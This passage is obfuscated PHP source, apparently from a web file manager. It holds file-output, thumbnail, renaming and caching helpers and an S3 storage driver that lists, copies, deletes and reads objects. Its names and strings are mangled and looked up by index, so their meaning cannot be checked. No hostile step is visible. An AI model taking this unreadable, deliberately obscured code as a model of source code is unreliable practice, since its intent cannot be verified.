$Õ¸ôœÏÔ, $˜ª²Õ·Ø); $Õ¸ôœÏÔ += $˜ª²Õ·Ø; if ($˜ª²Õ·Ø == $áÙßş©Í) { $Õ¸ôœÏÔ = $”ˆéÏ¿² + 1; } if ($§îûäº–) { $½ı­ø‘ = intval(1000 * 1000 * (timeFloat() - $Ô«Ì©Òø)); $üş«Ê¬µ = $§îûäº– - $½ı­ø‘; if ($üş«Ê¬µ > 5) { usleep($üş«Ê¬µ); } } } } public function fileOutServer($ûğìÄæç, $ªäı•¨ã = false, $¸’î’ïĞ = false, $¥ÑÚ¦õ = '') { $this->fileOut($ûğìÄæç, $ªäı•¨ã, $¸’î’ïĞ, $¥ÑÚ¦õ); } public function fileOutLink($èÙŞ¯£À) { header($_SERVER[³·—™¤¢][161] . $èÙŞ¯£À); die; } public function cacheMethod($œİ‹—ç›, $ı¤¾åÈˆ, $ŠĞíµœ = null) { $Å×ùÌÅ« =& $_SERVER[³·—™¤¢]; static $½œäìÀ¿ = array(); $€¨ÆëÍÈ = $ı¤¾åÈˆ ? ltrim($this->getPathOuter($ı¤¾åÈˆ), $Å×ùÌÅ«[8]) : $Å×ùÌÅ«[12]; $·£ìîíè = $Å×ùÌÅ«[162] . $œİ‹—ç› . $Å×ùÌÅ«[163] . rtrim($€¨ÆëÍÈ, $Å×ùÌÅ«[8]); if (is_null($œİ‹—ç›)) { $½œäìÀ¿ = array(); return; } if (is_null($ı¤¾åÈˆ)) { foreach ($½œäìÀ¿ as $·£ìîíè => $»£ş¡Åˆ) { if (!strstr($·£ìîíè, $Å×ùÌÅ«[162] . $œİ‹—ç› . $Å×ùÌÅ«[164])) { continue; } unset($½œäìÀ¿[$·£ìîíè]); } return; } if (!is_null($ŠĞíµœ)) { $½œäìÀ¿[$·£ìîíè] = $ŠĞíµœ; return; } $ô¼ÖÌô¬ = isset($½œäìÀ¿[$·£ìîíè]) ? $½œäìÀ¿[$·£ìîíè] : null; if (!is_null($ô¼ÖÌô¬)) { return $ô¼ÖÌô¬; } $ô¼ÖÌô¬ = $this->{$œİ‹—ç›}($ı¤¾åÈˆ); $½œäìÀ¿[$·£ìîíè] = $ô¼ÖÌô¬; return $ô¼ÖÌô¬; } public function cacheMethodInfoSet($Ç×œ×ãÁ, $è÷¦Şá«, $©†Ÿòæ¥ = false) { $ÚÎĞ³åË =& $_SERVER[³·—™¤¢]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ÚÎĞ³åË[165], $Ç×œ×ãÁ, $è÷¦Şá«); $this->cacheMethod($ÚÎĞ³åË[166], $Ç×œ×ãÁ, $è÷¦Şá« ? !1 : !0); if (is_array($©†Ÿòæ¥)) { $this->cacheMethod($ÚÎĞ³åË[167], $Ç×œ×ãÁ, $©†Ÿòæ¥); } } public function fileOutImage($ÕŸ‡ÔÏ, $®‡ª²¾æ = 250) { $²Ë±Å»‡ =& $_SERVER[³·—™¤¢]; set_timeout(); if (substr($ÕŸ‡ÔÏ, 0, 4) == $²Ë±Å»‡[148]) { $this->fileOutLink($ÕŸ‡ÔÏ); } $Ä€¾¤µõ = $this->info($ÕŸ‡ÔÏ); $ñıÆíóˆ = $Ä€¾¤µõ[$²Ë±Å»‡[32]]; $ãÙ˜ù˜ƒ = !1; if (isset($GLOBALS[$²Ë±Å»‡[168]]) && $GLOBALS[$²Ë±Å»‡[168]][$²Ë±Å»‡[84]] == $Ä€¾¤µõ[$²Ë±Å»‡[84]]) { $‹‘ûúÎ› = $GLOBALS[$²Ë±Å»‡[168]][$²Ë±Å»‡[169]]; if (!$Ä€¾¤µõ[$²Ë±Å»‡[170]]) { $Ä€¾¤µõ[$²Ë±Å»‡[170]] = $GLOBALS[$²Ë±Å»‡[168]]; } if (isset($‹‘ûúÎ›[$²Ë±Å»‡[171]])) { if ($‹‘ûúÎ›[$²Ë±Å»‡[171]] <= $®‡ª²¾æ && $‹‘ûúÎ›[$²Ë±Å»‡[172]] <= $®‡ª²¾æ) { $ãÙ˜ù˜ƒ = !0; } } $ñıÆíóˆ = $Ä€¾¤µõ[$²Ë±Å»‡[170]][$²Ë±Å»‡[32]]; } if ($Ä€¾¤µõ[$²Ë±Å»‡[76]] <= 1024 * 50 || $ãÙ˜ù˜ƒ || !function_exists($²Ë±Å»‡[173]) || $Ä€¾¤µõ[$²Ë±Å»‡[174]] == $²Ë±Å»‡[175]) { return $this->fileOut($ÕŸ‡ÔÏ, !1, $ñıÆíóˆ); } if (isset($Ä€¾¤µõ[$²Ë±Å»‡[170]][$²Ë±Å»‡[176]])) { $…ÈÛÌ…† = $Ä€¾¤µõ[$²Ë±Å»‡[170]][$²Ë±Å»‡[176]]; } else { if (isset($Ä€¾¤µõ[$²Ë±Å»‡[170]][$²Ë±Å»‡[177]])) { $…ÈÛÌ…† = $Ä€¾¤µõ[$²Ë±Å»‡[170]][$²Ë±Å»‡[177]]; } } if (!$…ÈÛÌ…†) { $…ÈÛÌ…† = md5("{$Ä€¾¤µõ[$²Ë±Å»‡[32]]}\137{$Ä€¾¤µõ[$²Ë±Å»‡[84]]}\x5f{$Ä€¾¤µõ[$²Ë±Å»‡[76]]}\137{$®‡ª²¾æ}"); } $Ò×…ê­ = "{$…ÈÛÌ…†}\137{$®‡ª²¾æ}\56\x70\x6e\147"; if (!($ëã»û = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $²Ë±Å»‡[178]))) { $¯ãÀÕ² = IO::mkdir(IO_PATH_SYSTEM_TEMP . $²Ë±Å»‡[179]); } else { $¯ãÀÕ² = KodIO::make($ëã»û); } if ($ëã»û = IO::fileNameExist($¯ãÀÕ², $Ò×…ê­)) { $„«Äûİ = KodIO::make($ëã»û); return IO::fileOut($„«Äûİ, !1, $ñıÆíóˆ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $„«Äûİ = DATA_THUMB . $Ò×…ê­; del_file($„«Äûİ); if (!@file_exists($„«Äûİ)) { $ÄÆ¹Ñç = TEMP_FILES; if (!is_dir($ÄÆ¹Ñç)) { mk_dir($ÄÆ¹Ñç); } $ÆŠÙÇá = $ÄÆ¹Ñç . $…ÈÛÌ…† . $²Ë±Å»‡[10] . $Ä€¾¤µõ[$²Ë±Å»‡[174]]; if (!@file_exists($ÆŠÙÇá)) { $ÆŠÙÇá = $this->download($ÕŸ‡ÔÏ, $ÆŠÙÇá); } ImageThumb::createThumb($ÆŠÙÇá, $„«Äûİ, $®‡ª²¾æ, $®‡ª²¾æ * 10); } if (!file_exists($„«Äûİ) || filesize($„«Äûİ) < 100) { return @file_exists($ÆŠÙÇá) ? IO::fileOut($ÆŠÙÇá) : $this->fileOut($ÕŸ‡ÔÏ); } if (!($ûÕÒÊñÆ = IO::move($„«Äûİ, $¯ãÀÕ²))) { return IO::fileOut($„«Äûİ); } del_file($„«Äûİ); IO::fileOut($ûÕÒÊñÆ); } public function fileOutImageServer($ìá®­·Á, $ÈŒ»· ¡ = 250) { $this->fileOutImage($ìá®­·Á, $ÈŒ»· ¡); } public function fileNameAuto($ø¸ª¼, $Ü³‰àò, $Ø¸ÆêŒõ = REPEAT_RENAME, $ÀÌ°­ßæ = false) { $ŠÌÍ¢ª =& $_SERVER[³·—™¤¢]; $ÉÊ¶ÂúÚ = $ø¸ª¼ === $ŠÌÍ¢ª[12] ? $Ü³‰àò : rtrim($ø¸ª¼, $ŠÌÍ¢ª[8]) . $ŠÌÍ¢ª[8] . $Ü³‰àò; if ($Ø¸ÆêŒõ == REPEAT_REPLACE || !$this->exist($ÉÊ¶ÂúÚ) || $ÀÌ°­ßæ && $Ø¸ÆêŒõ != REPEAT_RENAME_FOLDER) { return $Ü³‰àò; } if ($Ø¸ÆêŒõ == REPEAT_SKIP) { return !1; } $ò´«­¡§ = $ŠÌÍ¢ª[10] . get_path_ext($Ü³‰àò); $ò´«­¡§ = $ò´«­¡§ == $ŠÌÍ¢ª[10] || $ÀÌ°­ßæ ? $ŠÌÍ¢ª[12] : $ò´«­¡§; $¦¢ê®Ä = 1; $”ïà‡‰¡ = substr($Ü³‰àò, 0, strlen($Ü³‰àò) - strlen($ò´«­¡§)); $Õ´ì » = $”ïà‡‰¡ . "\x28{$¦¢ê®Ä}\51{$ò´«­¡§}"; while ($this->exist(rtrim($ø¸ª¼, $ŠÌÍ¢ª[8]) . $ŠÌÍ¢ª[8] . $Õ´ì »)) { $Õ´ì » = $”ïà‡‰¡ . "\x28{$¦¢ê®Ä}\x29{$ò´«­¡§}"; $¦¢ê®Ä++; } return $Õ´ì »; } private function fileNameAutoList($¥œßõ¥, $Ùğëó“é, $“å¹‡û¼ = false) { $„£ƒ‡Ò =& $_SERVER[³·—™¤¢]; $úÇ’ºŸö = $this->listPath($¥œßõ¥, !0); $úÇ’ºŸö = array_merge($úÇ’ºŸö[$„£ƒ‡Ò[82]], $úÇ’ºŸö[$„£ƒ‡Ò[83]]); $‘Â¥áÖÂ = array_to_keyvalue($úÇ’ºŸö, $„£ƒ‡Ò[12], $„£ƒ‡Ò[32]); $‰¦Û…‹ü = $„£ƒ‡Ò[10] . get_path_ext($Ùğëó“é); $‰¦Û…‹ü = $‰¦Û…‹ü == $„£ƒ‡Ò[10] || $“å¹‡û¼ ? $„£ƒ‡Ò[12] : $‰¦Û…‹ü; $œ”Í‹ù÷ = substr($Ùğëó“é, 0, strlen($Ùğëó“é) - strlen($‰¦Û…‹ü)); $Í”â°®“ = $œ”Í‹ù÷ . "\50\x30\51{$‰¦Û…‹ü}"; for ($úÎÑ = 1; $úÎÑ <= count($‘Â¥áÖÂ) + 1; $úÎÑ++) { $Í”â°®“ = $œ”Í‹ù÷ . "\x28{$úÎÑ}\x29{$‰¦Û…‹ü}"; if (!in_array_not_case($Í”â°®“, $‘Â¥áÖÂ)) { return $Í”â°®“; } } return $Í”â°®“; } public function listAllFiles($à²¶ÕËê, $˜Ä®Ÿ‘, $ŠÛ²îã = array()) { $»ØÜºê =& $_SERVER[³·—™¤¢]; if (empty($˜Ä®Ÿ‘)) { return array(); } $µŒú°÷Ö = array(); $à²¶ÕËê = trim($à²¶ÕËê, $»ØÜºê[8]); foreach ($˜Ä®Ÿ‘ as $»èÀà½ö) { $ºïüÌÆ© = ltrim(substr(trim($»èÀà½ö, $»ØÜºê[8]), strlen($à²¶ÕËê)), $»ØÜºê[8]); $µŒú°÷Ö = array_merge($µŒú°÷Ö, $this->slicePath($ºïüÌÆ©)); } $©ìÓ¬‡º = array(); foreach (array_unique($µŒú°÷Ö) as $»èÀà½ö) { $ş’Â’½– = array($»ØÜºê[84] => $this->getPathOuter($»ØÜºê[8] . $à²¶ÕËê . $»ØÜºê[8] . $»èÀà½ö), $»ØÜºê[75] => 1, $»ØÜºê[76] => 0); if (substr($»èÀà½ö, -1) != $»ØÜºê[8]) { $ş’Â’½–[$»ØÜºê[75]] = 0; $¢ş’’ñë = $this->getPath($à²¶ÕËê . $»ØÜºê[8] . $»èÀà½ö); $ş’Â’½–[$»ØÜºê[76]] = isset($ŠÛ²îã[$¢ş’’ñë]) ? $ŠÛ²îã[$¢ş’’ñë] : $this->size($¢ş’’ñë); } $©ìÓ¬‡º[] = $ş’Â’½–; } return $©ìÓ¬‡º; } public function slicePath($ÓÌÂå³”) { $µÖĞ±õ· =& $_SERVER[³·—™¤¢]; $«Ú¶àË = explode($µÖĞ±õ·[8], trim($ÓÌÂå³”, $µÖĞ±õ·[8])); $µ¾ÚãÀØ = 0; do { ++$µ¾ÚãÀØ; $•ÍÇ÷¯ñ[] = implode($µÖĞ±õ·[8], array_slice($«Ú¶àË, 0, $µ¾ÚãÀØ)) . $µÖĞ±õ·[8]; } while ($µ¾ÚãÀØ < count($«Ú¶àË)); $•ÍÇ÷¯ñ[count($«Ú¶àË) - 1] = $ÓÌÂå³”; return $•ÍÇ÷¯ñ; } public function getHost() { $‘ıèÇç£ =& $_SERVER[³·—™¤¢]; $ù³Ô’Ş = parse_url(trim($this->domain, $‘ıèÇç£[8])); $ı†ÁÍ®° = isset($ù³Ô’Ş[$‘ıèÇç£[180]]) ? $ù³Ô’Ş[$‘ıèÇç£[180]] : http_type(); $·¡¶ÎÕ = isset($ù³Ô’Ş[$‘ıèÇç£[181]]) ? $ù³Ô’Ş[$‘ıèÇç£[181]] : $ù³Ô’Ş[$‘ıèÇç£[84]]; if (isset($ù³Ô’Ş[$‘ıèÇç£[182]])) { $·¡¶ÎÕ .= $‘ıèÇç£[4] . $ù³Ô’Ş[$‘ıèÇç£[182]]; } return $ı†ÁÍ®° . $‘ıèÇç£[183] . $·¡¶ÎÕ; } public function pathEncode($·¯ïôß) { $„Á¶§ôã =& $_SERVER[³·—™¤¢]; return str_replace($„Á¶§ôã[184], $„Á¶§ôã[8], rawurlencode($·¯ïôß)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($Ò™¹Ë¸) { set_timeout(); require_once SDK_DIR . $_SERVER[³·—™¤¢][185]; parent::__construct(); $this->_init($Ò™¹Ë¸); } public function _init($•ØŒ¾Ö) { foreach ($•ØŒ¾Ö as $¬¢²Ø¸‚ => $äé“Ó“) { if (isset($this->{$¬¢²Ø¸‚})) { $this->{$¬¢²Ø¸‚} = $äé“Ó“; } } $this->endpoint = $•ØŒ¾Ö[$_SERVER[³·—™¤¢][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($²Õ¹÷òÏ = "\166\64") { $this->signVer = $²Õ¹÷òÏ; $this->client->setSignatureVersion($²Õ¹÷òÏ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $¹­‰À¡© =& $_SERVER[³·—™¤¢]; $âı“÷² = $this->getBucketCors(); if (!$âı“÷² || !is_array($âı“÷²)) { return !1; } if ($âı“÷²[$¹­‰À¡©[187]] != $¹­‰À¡©[188] || $âı“÷²[$¹­‰À¡©[189]] != $¹­‰À¡©[188]) { return !1; } $ğƒÍ„ = array_map($¹­‰À¡©[190], $âı“÷²[$¹­‰À¡©[191]]); if (!is_array($ğƒÍ„)) { $ğƒÍ„ = array(); } $»¹Îîß = array($¹­‰À¡©[192], $¹­‰À¡©[193], $¹­‰À¡©[194], $¹­‰À¡©[195], $¹­‰À¡©[196]); $½ºĞĞßÕ = array_diff($»¹Îîß, $ğƒÍ„); return empty($½ºĞĞßÕ); } public function mkfile($© ¢Ûä, $ô²±ØØ = '', $Èé¢˜¿º = REPEAT_RENAME) { $øµ³§ = $this->setContent($© ¢Ûä, $ô²±ØØ); if ($øµ³§ !== !1) { return $this->getPathOuter($© ¢Ûä); } return !1; } public function mkdir($Í¹¨Ù³™, $ğÑ†«Ûé = REPEAT_SKIP) { $Ü†®”ê× =& $_SERVER[³·—™¤¢]; if (empty($Í¹¨Ù³™) && $Í¹¨Ù³™ !== $Ü†®”ê×[197]) { return !1; } if ($ğÑ†«Ûé && $this->_isFolder($Í¹¨Ù³™)) { return $this->getPathOuter($Í¹¨Ù³™); } $º°²úú‰ = $this->setContent($Í¹¨Ù³™, $Ü†®”ê×[12], !0); if ($º°²úú‰ !== !1) { return $this->getPathOuter($Í¹¨Ù³™); } return !1; } public function copyFile($èÍ‘Çœ, $¿×¡À, $ÄşÊÃØ£ = array()) { $Õ“—¥‹Ö =& $_SERVER[³·—™¤¢]; $¶’¬‰«š = $this->objectMeta($èÍ‘Çœ); if (!$¶’¬‰«š) { return !1; } if ($¶’¬‰«š[$Õ“—¥‹Ö[76]] <= 1024 * 1024 * 200) { $¡ÇÒ¶Øå = $this->client->copyObject($this->bucket, $èÍ‘Çœ, $this->bucket, $¿×¡À, $Õ“—¥‹Ö[198], $ÄşÊÃØ£); } else { $¡ÇÒ¶Øå = $this->client->multiCopyObject($this->bucket, $èÍ‘Çœ, $this->bucket, $¿×¡À, $ÄşÊÃØ£); } $¡ÇÒ¶Øå = $¡ÇÒ¶Øå ? $this->getPathOuter($¿×¡À) : !1; return $¡ÇÒ¶Øå; } public function moveFile($‚±˜ôˆ, $Ç³­úëĞ) { if ($this->copyFile($‚±˜ôˆ, $Ç³­úëĞ)) { $this->delFile($‚±˜ôˆ); return $this->getPathOuter($Ç³­úëĞ); } return !1; } public function delFile($Ñ¨µ‡ë) { return $this->client->deleteObject($this->bucket, $Ñ¨µ‡ë); } public function delFolder($‹²ÕÙáÛ) { $ûıÛ›Ù­ =& $_SERVER[³·—™¤¢]; if (!$this->exist($‹²ÕÙáÛ)) { return !0; } $this->listItemCache = !1; $é¸Ô€Ì† = $this->fileList($‹²ÕÙáÛ); $this->listItemCache = !0; $Èè‚Ÿ˜¬ = trim($‹²ÕÙáÛ, $ûıÛ›Ù­[8]) . $ûıÛ›Ù­[8]; if (!empty($‹²ÕÙáÛ) && $‹²ÕÙáÛ !== $ûıÛ›Ù­[197] && !in_array($Èè‚Ÿ˜¬, $é¸Ô€Ì†[$ûıÛ›Ù­[82]])) { $é¸Ô€Ì†[$ûıÛ›Ù­[82]][] = $Èè‚Ÿ˜¬; } $İÈóà¹ = $this->delByBatch($é¸Ô€Ì†[$ûıÛ›Ù­[83]]); if (!$İÈóà¹) { return !1; } $İÈóà¹ = $this->delByBatch($é¸Ô€Ì†[$ûıÛ›Ù­[82]]); if (!$İÈóà¹) { return !1; } return $this->delFile($Èè‚Ÿ˜¬); } private function delByBatch($‰ş½ƒÚÃ) { foreach (array_chunk($‰ş½ƒÚÃ, 1000) as $û¥¾°‘”) { $†›úîä = $this->client->deleteObjects($this->bucket, $û¥¾°‘”); if (!$†›úîä) { return !1; } } return !0; } public function rename($¡™È¡, $Ş¤¬™šâ) { return $this->renameObject($¡™È¡, $Ş¤¬™šâ); } public function listPath($ÑÖøúÏ¯, $¤‹Ó¿™ğ = false) { $ĞìÑÊŠ =& $_SERVER[³·—™¤¢]; $³ş™èüú = $this->fileList($ÑÖøúÏ¯, $ĞìÑÊŠ[8], !0); foreach ($³ş™èüú[$ĞìÑÊŠ[82]] as $½ŸØŸÂî => $Ô”ÍğÔì) { $³ş™èüú[$ĞìÑÊŠ[82]][$½ŸØŸÂî] = $this->folderInfo($Ô”ÍğÔì, $¤‹Ó¿™ğ, $Ô”ÍğÔì); } foreach ($³ş™èüú[$ĞìÑÊŠ[83]] as $½ŸØŸÂî => $Ô”ÍğÔì) { $³ş™èüú[$ĞìÑÊŠ[83]][$½ŸØŸÂî] = $this->fileInfo($Ô”ÍğÔì[$ĞìÑÊŠ[32]], $¤‹Ó¿™ğ, $Ô”ÍğÔì); } return $³ş™èüú; } protected function infoChildren($„áñÌ•, &$É¦ÉÎì) { $ƒ‚ğãıâ =& $_SERVER[³·—™¤¢]; $«âÁİ˜¯ = $this->fileList($„áñÌ•, $ƒ‚ğãıâ[12], !0); $É¦ÉÎì[$ƒ‚ğãıâ[78]] += count($«âÁİ˜¯[$ƒ‚ğãıâ[82]]); $É¦ÉÎì[$ƒ‚ğãıâ[77]] += count($«âÁİ˜¯[$ƒ‚ğãıâ[83]]); foreach ($«âÁİ˜¯[$ƒ‚ğãıâ[83]] as $°æçšòË) { if (!$°æçšòË || !$°æçšòË[$ƒ‚ğãıâ[76]]) { continue; } $É¦ÉÎì[$ƒ‚ğãıâ[76]] += $°æçšòË[$ƒ‚ğãıâ[76]]; } } private function fileInfo($Š“ö‹³Î, $÷¥Ÿ™§ƒ = false, $®µÜú¯ô = array()) { $¦Ò©œğ¬ =& $_SERVER[³·—™¤¢]; $Ö–ŞœÎÓ = array($¦Ò©œğ¬[32] => $this->pathThis($Š“ö‹³Î), $¦Ò©œğ¬[84] => $this->getPathOuter($Š“ö‹³Î), $¦Ò©œğ¬[33] => $¦Ò©œğ¬[199], $¦Ò©œğ¬[174] => $this->ext($Š“ö‹³Î), $¦Ò©œğ¬[76] => isset($®µÜú¯ô[$¦Ò©œğ¬[76]]) ? $®µÜú¯ô[$¦Ò©œğ¬[76]] : 0); if ($÷¥Ÿ™§ƒ) { return $Ö–ŞœÎÓ; } $Ö–ŞœÎÓ[$¦Ò©œğ¬[200]] = $Ö–ŞœÎÓ[$¦Ò©œğ¬[85]] = 0; $Ö–ŞœÎÓ[$¦Ò©œğ¬[201]] = $Ö–ŞœÎÓ[$¦Ò©œğ¬[202]] = !0; if (empty($®µÜú¯ô)) { $®µÜú¯ô = $this->objectMeta($Š“ö‹³Î); if (!$®µÜú¯ô) { return $Ö–ŞœÎÓ; } } if (isset($®µÜú¯ô[$¦Ò©œğ¬[203]])) { $Ö–ŞœÎÓ[$¦Ò©œğ¬[85]] = $®µÜú¯ô[$¦Ò©œğ¬[203]]; } if (isset($®µÜú¯ô[$¦Ò©œğ¬[76]])) { $Ö–ŞœÎÓ[$¦Ò©œğ¬[76]] = $®µÜú¯ô[$¦Ò©œğ¬[76]]; } return $Ö–ŞœÎÓ; } private function folderInfo($ä¢¯¦ıÉ, $Ú„²ÃßÌ = false, $Ú“ğœµÔ = array()) { $ÎÓüÓİï =& $_SERVER[³·—™¤¢]; $éÇû•ïñ = array($ÎÓüÓİï[32] => $this->pathThis($ä¢¯¦ıÉ), $ÎÓüÓİï[84] => $this->getPathOuter($ÎÓüÓİï[8] . $ä¢¯¦ıÉ), $ÎÓüÓİï[33] => $ÎÓüÓİï[75]); if ($Ú„²ÃßÌ) { return $éÇû•ïñ; } $éÇû•ïñ[$ÎÓüÓİï[200]] = $éÇû•ïñ[$ÎÓüÓİï[85]] = 0; $éÇû•ïñ[$ÎÓüÓİï[201]] = $éÇû•ïñ[$ÎÓüÓİï[202]] = !0; if ($ä¢¯¦ıÉ == $ÎÓüÓİï[12]) { return $éÇû•ïñ; } if (empty($Ú“ğœµÔ)) { $Ú“ğœµÔ = $this->objectMeta(trim($ä¢¯¦ıÉ, $ÎÓüÓİï[8]) . $ÎÓüÓİï[8]); } if (isset($Ú“ğœµÔ[$ÎÓüÓİï[203]])) { $éÇû•ïñ[$ÎÓüÓİï[200]] = $Ú“ğœµÔ[$ÎÓüÓİï[203]]; } return $éÇû•ïñ; } private function fileList($É‡ê¬­ô, $‹êËÅ½ã = '', $Øù»ˆŒ = 0) { $Ùòëş‡ =& $_SERVER[³·—™¤¢]; $ù­®ïØä = rtrim($É‡ê¬­ô, $Ùòëş‡[8]) . $Ùòëş‡[8]; $×ø®¾æÌ = $this->listObjs($ù­®ïØä, null, null, $‹êËÅ½ã); if (!$×ø®¾æÌ) { return array($Ùòëş‡[82] => array(), $Ùòëş‡[83] => array()); } $ŸÜâ’· = $ô£¼ÏÀù = array(); foreach ($×ø®¾æÌ[$Ùòëş‡[204]] as $³½ª˜½‹) { $ˆë·®Ú = $³½ª˜½‹[$Ùòëş‡[32]]; if ($ˆë·®Ú == $ù­®ïØä) { continue; } $•—¯À¦‚ = isset($³½ª˜½‹[$Ùòëş‡[76]]) ? $³½ª˜½‹[$Ùòëş‡[76]] : 0; $£òËÃòˆ = $•—¯À¦‚ == 0 && substr($ˆë·®Ú, strlen($ˆë·®Ú) - 1, 1) == $Ùòëş‡[8] ? !0 : !1; $this->cacheMethodInfoSet($ˆë·®Ú, $£òËÃòˆ, $³½ª˜½‹); if ($£òËÃòˆ) { $ŸÜâ’·[] = $ˆë·®Ú; continue; } $ô£¼ÏÀù[] = $Øù»ˆŒ ? $³½ª˜½‹ : $ˆë·®Ú; } foreach ($×ø®¾æÌ[$Ùòëş‡[205]] as $³½ª˜½‹) { $ŸÜâ’·[] = $³½ª˜½‹[$Ùòëş‡[32]]; $this->cacheMethodInfoSet($³½ª˜½‹[$Ùòëş‡[32]], !0); } $this->cacheMethodInfoSet($É‡ê¬­ô, !0); return array($Ùòëş‡[82] => $ŸÜâ’·, $Ùòëş‡[83] => $ô£¼ÏÀù); } private function listObjs($œûÓÁ¯À, $¼ğæ³¹È = null, $¿†¬ºÎÀ = null, $ˆÂ¦òÁ’ = null) { $¼ŠëÏôÏ =& $_SERVER[³·—™¤¢]; $œûÓÁ¯À = trim($œûÓÁ¯À, $¼ŠëÏôÏ[8]); $Ÿ‹’³¬“ = empty($œûÓÁ¯À) && $œûÓÁ¯À !== $¼ŠëÏôÏ[197] ? $¼ŠëÏôÏ[12] : $œûÓÁ¯À . $¼ŠëÏôÏ[8]; return $this->client->getBucket($this->bucket, $Ÿ‹’³¬“, $¼ğæ³¹È, $¿†¬ºÎÀ, $ˆÂ¦òÁ’, !0); } public function has($£ï¡ĞÆ•, $„Ù×àƒ‰ = false, $¨àÛ˜°¶ = true) { $µÕ½©–å =& $_SERVER[³·—™¤¢]; $£ï¡ĞÆ• = trim($£ï¡ĞÆ•, $µÕ½©–å[8]); $ÏÂ„º¢ù = empty($£ï¡ĞÆ•) && $£ï¡ĞÆ• !== $µÕ½©–å[197] ? $µÕ½©–å[12] : $£ï¡ĞÆ• . $µÕ½©–å[8]; $ôÏ›½¯ = null; $óä†î³€ = 500; $ÀÆª¥”Ÿ = $µÕ½©–å[8]; $ëöíÇƒ = $ßí–ß÷ = array(); while (!0) { $„­¨ÎÙĞ = $this->listObjs($£ï¡ĞÆ•, $ôÏ›½¯, $óä†î³€, $ÀÆª¥”Ÿ); if (!$„­¨ÎÙĞ) { break; } $ôÏ›½¯ = $„­¨ÎÙĞ[$µÕ½©–å[206]]; $ò“ü—…û = $„­¨ÎÙĞ[$µÕ½©–å[204]]; $Í“ÏÃ‚ï = $„­¨ÎÙĞ[$µÕ½©–å[205]]; if (empty($ò“ü—…û) && empty($Í“ÏÃ‚ï)) { break; } if (count($ò“ü—…û) == 1 && $ò“ü—…û[0][$µÕ½©–å[32]] == $ÏÂ„º¢ù) { break; } if ($„Ù×àƒ‰) { if (count($ò“ü—…û)) { $ò“ü—…û = array_column($ò“ü—…û, $µÕ½©–å[32]); $ëöíÇƒ = array_merge($ëöíÇƒ, $ò“ü—…û); } if (count($Í“ÏÃ‚ï)) { $Í“ÏÃ‚ï = array_column($Í“ÏÃ‚ï, $µÕ½©–å[32]); $ßí–ß÷ = array_merge($ßí–ß÷, $Í“ÏÃ‚ï); } if ($ôÏ›½¯ === null) { break; } continue; } if ($¨àÛ˜°¶) { if (!empty($ò“ü—…û)) { if (count($ò“ü—…û) > 1 || isset($ò“ü—…û[0][$µÕ½©–å[32]]) && $ò“ü—…û[0][$µÕ½©–å[32]] != $ÏÂ„º¢ù) { return !0; } } } else { if (!empty($Í“ÏÃ‚ï)) { return !0; } } if ($ôÏ›½¯ === null) { break; } } if ($„Ù×àƒ‰) { $ëöíÇƒ = array_diff($ëöíÇƒ, array($ÏÂ„º¢ù)); $ëöíÇƒ = count(array_unique($ëöíÇƒ)); $ßí–ß÷ = count(array_unique($ßí–ß÷)); return array($µÕ½©–å[207] => $ëöíÇƒ, $µÕ½©–å[208] => $ßí–ß÷); } return !1; } public function listAll($†¤óË£Ç) { $ğ«Ä‡‚Õ =& $_SERVER[³·—™¤¢]; $°©›Œø = $this->fileList($†¤óË£Ç, $ğ«Ä‡‚Õ[12], !0); $ÚÆƒËâ¼ = array(); foreach ($°©›Œø[$ğ«Ä‡‚Õ[83]] as $š¨–©æ£) { $ÚÆƒËâ¼[$š¨–©æ£[$ğ«Ä‡‚Õ[32]]] = $š¨–©æ£[$ğ«Ä‡‚Õ[76]]; } foreach ($°©›Œø[$ğ«Ä‡‚Õ[82]] as $š¨–©æ£) { if (is_string($š¨–©æ£)) { $ÚÆƒËâ¼[$š¨–©æ£] = 0; } } return $this->listAllFiles($†¤óË£Ç, array_keys($ÚÆƒËâ¼), $ÚÆƒËâ¼); } public function canRead($Ø“§ˆ««) { $ş¾ƒ“›ğ =& $_SERVER[³·—™¤¢]; $ÀÅÊÊƒ· = $this->client->getAccessControlPolicy($this->bucket, $Ø“§ˆ««); if (!$ÀÅÊÊƒ·) { return !1; } return in_array($ÀÅÊÊƒ·, array($ş¾ƒ“›ğ[209], $ş¾ƒ“›ğ[210], $ş¾ƒ“›ğ[211])) ? !0 : !1; } public function canWrite($“Íşı’) { $Û²“‰¸ =& $_SERVER[³·—™¤¢]; $¿­©±¾à = $this->client->getAccessControlPolicy($this->bucket, $“Íşı’); if (!$¿­©±¾à) { return !1; } return in_array($¿­©±¾à, array($Û²“‰¸[209], $Û²“‰¸[210])) ? !0 : !1; } public function getContent($à·ğÌõı) { return $this->client->getObject($this->bucket, $à·ğÌõı); } public function setContent($·ˆïğúÛ, $Íİ–ÎÑË = '', $Ùğªˆš = false) { $Õö±×– =& $_SERVER[³·—™¤¢]; $·ˆïğúÛ = $Ùğªˆš ? trim($·ˆïğúÛ, $Õö±×–[8]) . $Õö±×–[8] : $·ˆïğúÛ; $ş¡ãÆÚØ = get_file_mime(get_path_ext($·ˆïğúÛ)); $ï±î¦ = $this->client->putObject($Íİ–ÎÑË, $this->bucket, $·ˆïğúÛ, $Õö±×–[198], array(), $ş¡ãÆÚØ); if (!$ï±î¦) { return !1; } if ($Ùğªˆš) { return !0; } $this->cacheMethod(null, null); $ï±î¦ = $this->copyFile($·ˆïğúÛ, $·ˆïğúÛ, array($Õö±×–[212] => $ï±î¦[$Õö±×–[213]])); return $ï±î¦ ? !0 : !1; } public function fileSubstr($ÙÈäúãÉ, $·œ›ƒºû, $à¦ÄĞ¿) { $ÔÜ»í¬ = $·œ›ƒºû + $à¦ÄĞ¿ - 1; return $this->client->getObject($this->bucket, $ÙÈäúãÉ, array($_SERVER[³·—™¤¢][214] => "\142\171\164\x65\163\75{$·œ›ƒºû}\55{$ÔÜ»í¬}")); } public function upload($ûªÚôà, 